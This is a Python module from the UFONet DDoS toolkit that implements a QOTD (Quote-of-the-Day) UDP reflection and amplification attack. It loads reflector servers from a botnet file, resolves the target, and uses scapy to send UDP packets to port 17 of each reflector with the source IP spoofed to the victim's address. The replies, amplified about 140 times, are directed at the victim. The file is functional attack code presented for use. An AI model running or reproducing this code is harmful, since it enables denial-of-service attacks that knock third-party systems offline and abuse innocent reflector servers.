#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
from urllib.parse import urlparse
try:
    from scapy.all import *
except ImportError:
    from core._ensure import ensure
    if ensure('scapy.all', 'scapy') is None:
        print("\nError importing: scapy lib.\n")
        sys.exit(2)
    from scapy.all import *

qotd_file = "botnet/qotd.txt"

# UFONet QOTD Amplification (ORACLE) - amp factor ~140x (RFC 865, Quote-of-the-Day)
def oraclize(ip, rounds):
    n=0
    try:
        from core._botnet import load_botnet_file, warn_placeholders
        reflectors, _empty, _all_placeholder = load_botnet_file(qotd_file)
        if _empty:
            print("[Error] [AI] [ORACLE] botnet/qotd.txt is empty -> [Aborting!]")
            return
        if _all_placeholder:
            warn_placeholders("ORACLE", qotd_file, kind="qotd")
            return
        payload = b'\x00'
        for x in range(int(rounds)):
            n += 1
            print("[Info] [AI] [ORACLE] Asking 'prophecy' ["+str(n)+"] from the abyss! -> [SLOWING!]")
            for r in reflectors:
                try:
                    sport = random.randint(2000, 65535)
                    packet = IP(dst=r, src=ip) / UDP(sport=sport, dport=17) / Raw(load=payload)
                    send(packet, verbose=0)
                    print("[Info] [AI] [ORACLE] Asked 'prophecy' ["+str(n)+"] IS INTERACTING WITH ["+r+"] -> [AMPLIFYING!]")
                except:
                    print("[Info] [AI] [ORACLE] Asked 'prophecy' ["+str(n)+"] FAILED to reach ["+r+"] -> [PASSING!]")
    except:
        print("[Error] [AI] [ORACLE] Failing to engage... -> Is still target online? -> [Checking!]")

class QOTD(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] QOTD Amplification (ORACLE) is ready to fire: [", rounds, "prophecies ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                url = urlparse(target)
                a = r.resolve(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [ORACLE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        oraclize(ip, rounds)
